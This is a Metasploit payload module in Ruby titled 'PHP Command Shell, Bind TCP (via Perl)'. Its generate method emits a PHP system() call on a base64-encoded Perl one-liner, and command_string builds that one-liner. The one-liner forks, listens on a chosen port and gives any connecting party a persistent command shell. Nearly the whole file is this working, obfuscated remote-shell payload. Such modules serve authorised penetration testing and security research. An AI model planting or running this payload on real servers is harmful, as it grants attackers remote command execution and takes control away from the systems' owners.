##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  CachedSize = 230

  include Msf::Payload::Single
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'PHP Command Shell, Bind TCP (via Perl)',
      'Description'   => 'Listen for a connection and spawn a command shell via perl (persistent)',
      'Author'        => ['Samy <samy[at]samy.pl>', 'cazz'],
      'License'       => BSD_LICENSE,
      'Platform'      => 'php',
      'Arch'          => ARCH_PHP,
      'Handler'       => Msf::Handler::BindTcp,
      'Session'       => Msf::Sessions::CommandShell,
      'PayloadType'   => 'cmd',
      'Payload'       =>
        {
          'Offsets' => { },
          'Payload' => ''
        }
      ))
  end

  #
  # Constructs the payload
  #
  def generate
    return super + "system(base64_decode('#{Rex::Text.encode_base64(command_string)}'));"
  end

  #
  # Returns the command string to use for execution
  #
  def command_string

    cmd = "perl -MIO -e '$p=fork();exit,if$p;" +
      "$c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept;" +
      "$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>'"

    return cmd
  end
end
